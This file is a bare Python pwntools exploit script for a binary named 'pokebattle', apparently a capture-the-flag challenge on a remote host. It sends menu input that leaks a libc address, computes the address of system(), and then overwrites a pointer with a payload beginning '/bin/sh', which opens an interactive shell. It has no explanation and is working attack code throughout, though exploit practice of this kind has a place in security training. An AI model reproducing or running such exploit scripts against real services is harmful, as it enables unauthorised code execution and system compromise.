from pwn import *
context.log_level = 'debug'

TARGET = './pokebattle'
HOST = '114.177.250.4'
PORT = 2225

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()
if args.D:
    debug(r, [])

r.sendlineafter('> ', '2')
r.sendlineafter(':', '0')
r.sendlineafter(':', 'A'*8)

r.sendlineafter('> ', '4')
r.recvuntil('AAAAAAAA')
leak = u64(r.recv(6).ljust(8, '\x00'))
dbg("leak")
base = leak - 0x3fbf0a
dbg("base")
system = base + 0x4f440

r.sendlineafter(':', '0')

r.sendlineafter('> ', '2')
r.sendlineafter(':', '0')
payload = '/bin/sh\x00'
payload = payload.ljust(0x28, 'A')

payload += p64(system)
r.sendlineafter(':', payload)

r.sendlineafter('> ', '1')

r.interactive()
r.close()
